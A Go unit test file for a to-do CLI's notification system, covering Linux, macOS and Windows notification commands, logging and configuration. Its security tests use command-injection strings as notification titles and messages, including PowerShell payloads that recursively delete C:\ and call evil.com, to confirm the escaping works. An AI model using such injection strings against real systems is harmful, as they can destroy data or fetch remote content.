package notification_test

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"todoat/internal/notification"
	"todoat/internal/testutil"
)

// =============================================================================
// CLI Tests (022-notification-system)
// =============================================================================

// TestNotificationTest tests that 'todoat notification test' sends a test notification and exits 0
func TestNotificationTest(t *testing.T) {
	cli := testutil.NewCLITestWithNotification(t)

	stdout := cli.MustExecute("-y", "notification", "test")

	testutil.AssertContains(t, stdout, "Test notification sent")
	testutil.AssertResultCode(t, stdout, testutil.ResultActionCompleted)
}

// TestNotificationLog tests that 'todoat notification log' displays notification history
func TestNotificationLog(t *testing.T) {
	cli := testutil.NewCLITestWithNotification(t)

	// First send a test notification to create log entry
	cli.MustExecute("-y", "notification", "test")

	// View the log
	stdout := cli.MustExecute("-y", "notification", "log")

	// Should contain the test notification
	testutil.AssertContains(t, stdout, "TEST")
}

// TestNotificationLogClear tests that 'todoat notification log clear' clears the log file
func TestNotificationLogClear(t *testing.T) {
	cli := testutil.NewCLITestWithNotification(t)

	// First send a test notification to create log entry
	cli.MustExecute("-y", "notification", "test")

	// Clear the log
	stdout := cli.MustExecute("-y", "notification", "log", "clear")

	testutil.AssertContains(t, stdout, "cleared")
	testutil.AssertResultCode(t, stdout, testutil.ResultActionCompleted)

	// Verify log is empty
	stdout = cli.MustExecute("-y", "notification", "log")
	testutil.AssertContains(t, stdout, "No notifications")
}

// =============================================================================
// Unit Tests - OS Notification (with mock command executor)
// =============================================================================

// TestOSNotificationLinux tests that OS notification is sent via notify-send on Linux
func TestOSNotificationLinux(t *testing.T) {
	var executedCmd string
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedCmd = cmd
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("linux"),
	)

	n := notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     "Sync Complete",
		Message:   "Synced 5 tasks",
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	if executedCmd != "notify-send" {
		t.Errorf("expected notify-send command, got %q", executedCmd)
	}

	// Check args contain title and message
	argsStr := strings.Join(executedArgs, " ")
	if !strings.Contains(argsStr, "Sync Complete") {
		t.Errorf("expected args to contain title, got %v", executedArgs)
	}
	if !strings.Contains(argsStr, "Synced 5 tasks") {
		t.Errorf("expected args to contain message, got %v", executedArgs)
	}
}

// TestOSNotificationDarwin tests that OS notification is sent via osascript on macOS
func TestOSNotificationDarwin(t *testing.T) {
	var executedCmd string
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedCmd = cmd
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("darwin"),
	)

	n := notification.Notification{
		Type:      notification.NotifySyncError,
		Title:     "Sync Error",
		Message:   "Connection failed",
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	if executedCmd != "osascript" {
		t.Errorf("expected osascript command, got %q", executedCmd)
	}

	// Check args contain -e flag with display notification
	argsStr := strings.Join(executedArgs, " ")
	if !strings.Contains(argsStr, "-e") {
		t.Errorf("expected args to contain -e flag, got %v", executedArgs)
	}
	if !strings.Contains(argsStr, "display notification") {
		t.Errorf("expected args to contain 'display notification', got %v", executedArgs)
	}
}

// =============================================================================
// Unit Tests - Log Notification
// =============================================================================

// TestLogNotification tests that notifications are written to log file with correct format
func TestLogNotification(t *testing.T) {
	tmpDir := t.TempDir()
	logPath := filepath.Join(tmpDir, "notifications.log")

	channel := notification.NewLogNotificationChannel(&notification.LogNotificationConfig{
		Enabled:       true,
		Path:          logPath,
		MaxSizeMB:     10,
		RetentionDays: 30,
	})
	defer func() { _ = channel.Close() }()

	n := notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     "Sync Complete",
		Message:   "Synced 5 tasks with nextcloud",
		Timestamp: time.Date(2026, 1, 16, 10, 30, 0, 0, time.UTC),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// Read the log file
	data, err := os.ReadFile(logPath)
	if err != nil {
		t.Fatalf("failed to read log file: %v", err)
	}

	content := string(data)

	// Check format: 2026-01-16T10:30:00Z [SYNC_COMPLETE] Message
	if !strings.Contains(content, "2026-01-16T10:30:00Z") {
		t.Errorf("expected log to contain timestamp, got:\n%s", content)
	}
	if !strings.Contains(content, "[SYNC_COMPLETE]") {
		t.Errorf("expected log to contain [SYNC_COMPLETE], got:\n%s", content)
	}
	if !strings.Contains(content, "Synced 5 tasks with nextcloud") {
		t.Errorf("expected log to contain message, got:\n%s", content)
	}
}

// =============================================================================
// Unit Tests - Configuration
// =============================================================================

// TestNotificationConfig tests that configuration enables/disables notification channels
func TestNotificationConfig(t *testing.T) {
	tests := []struct {
		name             string
		osEnabled        bool
		logEnabled       bool
		expectedChannels int
	}{
		{"both enabled", true, true, 2},
		{"only os enabled", true, false, 1},
		{"only log enabled", false, true, 1},
		{"both disabled", false, false, 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			logPath := filepath.Join(tmpDir, "notifications.log")

			cfg := &notification.Config{
				Enabled: true,
				OSNotification: notification.OSNotificationConfig{
					Enabled:        tt.osEnabled,
					OnSyncComplete: true,
					OnSyncError:    true,
					OnConflict:     true,
				},
				LogNotification: notification.LogNotificationConfig{
					Enabled:       tt.logEnabled,
					Path:          logPath,
					MaxSizeMB:     10,
					RetentionDays: 30,
				},
			}

			// Use mock executor to avoid actual OS notifications
			mock := &notification.MockCommandExecutor{
				ExecuteFunc: func(cmd string, args ...string) error {
					return nil
				},
			}

			manager, err := notification.NewManager(cfg, notification.WithCommandExecutor(mock))
			if err != nil {
				t.Fatalf("failed to create manager: %v", err)
			}
			defer func() { _ = manager.Close() }()

			// Test that the manager was created successfully
			if manager == nil {
				t.Fatal("expected manager to be non-nil")
			}

			// Verify channel count (internal implementation detail - may need adjustment)
			channelCount := manager.ChannelCount()
			if channelCount != tt.expectedChannels {
				t.Errorf("expected %d channels, got %d", tt.expectedChannels, channelCount)
			}
		})
	}
}

// TestNotificationDisabled tests that when notification.enabled is false, no notifications are sent
func TestNotificationDisabled(t *testing.T) {
	cfg := &notification.Config{
		Enabled: false,
	}

	manager, err := notification.NewManager(cfg)
	if err != nil {
		t.Fatalf("failed to create manager: %v", err)
	}
	defer func() { _ = manager.Close() }()

	n := notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     "Test",
		Message:   "Test message",
		Timestamp: time.Now(),
	}

	// Should not error when notifications are disabled
	err = manager.Send(n)
	if err != nil {
		t.Errorf("expected no error for disabled notifications, got %v", err)
	}
}

// =============================================================================
// Security Tests - Command Injection Prevention (Issue #021)
// =============================================================================

// TestDarwinNotificationEscapesQuotes tests that double quotes in notification
// messages are properly escaped to prevent command injection via osascript
func TestDarwinNotificationEscapesQuotes(t *testing.T) {
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("darwin"),
	)

	// Malicious payload attempting command injection
	n := notification.Notification{
		Type:      notification.NotifyTest,
		Title:     `Test" & display dialog "pwned" & display notification "`,
		Message:   `Message" & do something bad & "`,
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// The script argument should have escaped quotes
	script := executedArgs[1] // args[0] is "-e", args[1] is the script

	// Verify escaped quotes are present
	if !strings.Contains(script, `\"`) {
		t.Errorf("expected script to contain escaped quotes, got: %s", script)
	}

	// The unescaped injection payload should NOT appear
	// Original: `Test" & display dialog` should become `Test\" & display dialog`
	// We check that an unescaped quote followed by & doesn't exist (without preceding backslash)
	if strings.Contains(script, `pwned`) && !strings.Contains(script, `\"pwned\"`) {
		t.Errorf("script contains unescaped injection - 'pwned' without escaped quotes: %s", script)
	}

	// The script should have properly escaped the quotes around the malicious parts
	if strings.Contains(script, `display dialog "pwned"`) {
		t.Errorf("script contains unescaped injection payload (dialog command): %s", script)
	}
}

// TestWindowsNotificationEscapesQuotes tests that double quotes in notification
// messages are properly escaped to prevent command injection via PowerShell
func TestWindowsNotificationEscapesQuotes(t *testing.T) {
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("windows"),
	)

	// Malicious payload attempting command injection
	n := notification.Notification{
		Type:      notification.NotifyTest,
		Title:     `"; Start-Process calc; $x="`,
		Message:   `test"; Remove-Item -Recurse C:\; $y="`,
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// The script argument should have escaped quotes
	script := executedArgs[1] // args[0] is "-Command", args[1] is the script

	// Verify the backtick-escaped quotes are present
	if !strings.Contains(script, "`\"") {
		t.Errorf("expected script to contain PowerShell-escaped quotes (`\"), got: %s", script)
	}

	// The unescaped injection payload should NOT appear - the semicolon after an unescaped quote
	// would allow command injection. With proper escaping, `"; becomes `"`"; which is safe.
	// Check that Start-Process is not in a position where it can execute
	if strings.Contains(script, `""; Start-Process`) {
		t.Errorf("script contains unescaped injection payload (Start-Process): %s", script)
	}

	// The escaped form should be present
	if !strings.Contains(script, "`\"; Start-Process") {
		t.Errorf("expected script to contain escaped injection pattern, got: %s", script)
	}
}

// TestDarwinNotificationEscapesBackslashes tests that backslashes are also escaped
func TestDarwinNotificationEscapesBackslashes(t *testing.T) {
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("darwin"),
	)

	n := notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     `Test\with\backslashes`,
		Message:   `Path: C:\Users\test`,
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	script := executedArgs[1]

	// Backslashes should be doubled in AppleScript
	if strings.Contains(script, `\w`) && !strings.Contains(script, `\\w`) {
		t.Errorf("expected backslashes to be escaped, got: %s", script)
	}
}

// TestWindowsNotificationEscapesDollarSign tests that dollar signs in notification
// messages are properly escaped to prevent subexpression injection via PowerShell (Issue #44)
func TestWindowsNotificationEscapesDollarSign(t *testing.T) {
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("windows"),
	)

	// Malicious payload attempting command injection via PowerShell subexpression
	n := notification.Notification{
		Type:      notification.NotifyTest,
		Title:     `Task $(calc.exe)`,
		Message:   `Reminder $(Invoke-WebRequest http://evil.com)`,
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// The script argument should have escaped dollar signs
	script := executedArgs[1] // args[0] is "-Command", args[1] is the script

	// Verify the dollar signs are escaped with backticks
	// In PowerShell, $() within double quotes executes subexpressions
	// Escaping $ as `$ prevents this
	if !strings.Contains(script, "`$(calc.exe)") {
		t.Errorf("expected script to contain escaped dollar sign (`$), title was not escaped. Got: %s", script)
	}

	if !strings.Contains(script, "`$(Invoke-WebRequest") {
		t.Errorf("expected script to contain escaped dollar sign (`$), message was not escaped. Got: %s", script)
	}

	// The unescaped injection payload should NOT appear
	if strings.Contains(script, "$(calc.exe)") && !strings.Contains(script, "`$(calc.exe)") {
		t.Errorf("script contains unescaped injection payload (subexpression): %s", script)
	}
}

// TestOSNotificationWindows tests that OS notification is sent via PowerShell on Windows
func TestOSNotificationWindows(t *testing.T) {
	var executedCmd string
	var executedArgs []string

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedCmd = cmd
			executedArgs = args
			return nil
		},
	}

	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("windows"),
	)

	n := notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     "Sync Complete",
		Message:   "Synced 5 tasks",
		Timestamp: time.Now(),
	}

	err := channel.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	if executedCmd != "powershell" {
		t.Errorf("expected powershell command, got %q", executedCmd)
	}

	// Check args contain -Command flag with notification script
	argsStr := strings.Join(executedArgs, " ")
	if !strings.Contains(argsStr, "-Command") {
		t.Errorf("expected args to contain -Command flag, got %v", executedArgs)
	}
	if !strings.Contains(argsStr, "BalloonTipTitle") {
		t.Errorf("expected args to contain 'BalloonTipTitle', got %v", executedArgs)
	}
	if !strings.Contains(argsStr, "Sync Complete") {
		t.Errorf("expected args to contain title, got %v", executedArgs)
	}
	if !strings.Contains(argsStr, "Synced 5 tasks") {
		t.Errorf("expected args to contain message, got %v", executedArgs)
	}
}

// TestNotificationManagerPlatformDetection tests that the manager auto-detects the platform
func TestNotificationManagerPlatformDetection(t *testing.T) {
	tmpDir := t.TempDir()
	logPath := filepath.Join(tmpDir, "notifications.log")

	var executedCmd string
	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			executedCmd = cmd
			return nil
		},
	}

	cfg := &notification.Config{
		Enabled: true,
		OSNotification: notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: true,
			OnSyncError:    true,
			OnConflict:     true,
		},
		LogNotification: notification.LogNotificationConfig{
			Enabled:       true,
			Path:          logPath,
			MaxSizeMB:     10,
			RetentionDays: 30,
		},
	}

	manager, err := notification.NewManager(cfg, notification.WithCommandExecutor(mock))
	if err != nil {
		t.Fatalf("failed to create manager: %v", err)
	}
	defer func() { _ = manager.Close() }()

	n := notification.Notification{
		Type:      notification.NotifyTest,
		Title:     "Test",
		Message:   "Test message",
		Timestamp: time.Now(),
	}

	err = manager.Send(n)
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// The command used should be platform-specific
	// On Linux: notify-send, on Darwin: osascript, on Windows: powershell
	// Since we're running on Linux in this test, we expect notify-send
	validCmds := []string{"notify-send", "osascript", "powershell"}
	found := false
	for _, cmd := range validCmds {
		if executedCmd == cmd {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected platform-specific command, got %q", executedCmd)
	}
}

// TestNotificationTypeFiltering tests that notification types are filtered based on config
func TestNotificationTypeFiltering(t *testing.T) {
	var sentNotifications []notification.Notification

	mock := &notification.MockCommandExecutor{
		ExecuteFunc: func(cmd string, args ...string) error {
			return nil
		},
	}

	// Create channel with OnSyncComplete disabled
	channel := notification.NewOSNotificationChannel(
		&notification.OSNotificationConfig{
			Enabled:        true,
			OnSyncComplete: false, // Disabled
			OnSyncError:    true,
			OnConflict:     true,
		},
		notification.WithCommandExecutor(mock),
		notification.WithPlatform("linux"),
		notification.WithSendCallback(func(n notification.Notification) {
			sentNotifications = append(sentNotifications, n)
		}),
	)

	// Try to send sync_complete - should be filtered
	err := channel.Send(notification.Notification{
		Type:      notification.NotifySyncComplete,
		Title:     "Complete",
		Message:   "Test",
		Timestamp: time.Now(),
	})
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// Try to send sync_error - should pass through
	err = channel.Send(notification.Notification{
		Type:      notification.NotifySyncError,
		Title:     "Error",
		Message:   "Test",
		Timestamp: time.Now(),
	})
	if err != nil {
		t.Fatalf("expected no error, got %v", err)
	}

	// Only sync_error should have been sent
	if len(sentNotifications) != 1 {
		t.Errorf("expected 1 notification sent, got %d", len(sentNotifications))
	}
	if len(sentNotifications) > 0 && sentNotifications[0].Type != notification.NotifySyncError {
		t.Errorf("expected sync_error to be sent, got %s", sentNotifications[0].Type)
	}
}
